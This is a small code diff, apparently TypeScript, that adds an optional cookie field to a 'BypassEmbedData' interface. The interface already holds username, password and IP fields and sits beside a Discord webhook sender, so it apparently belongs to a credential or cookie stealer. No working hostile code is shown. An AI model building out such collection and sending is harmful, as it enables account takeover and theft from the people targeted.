@@ -119,6 +119,7 @@ export async function sendDiscordWebhook(webhookUrl: string, message: string) {
 
 export interface BypassEmbedData {
   valid: boolean;
+  cookie?: string;
   username?: string;
   password?: string;
   ip?: string;
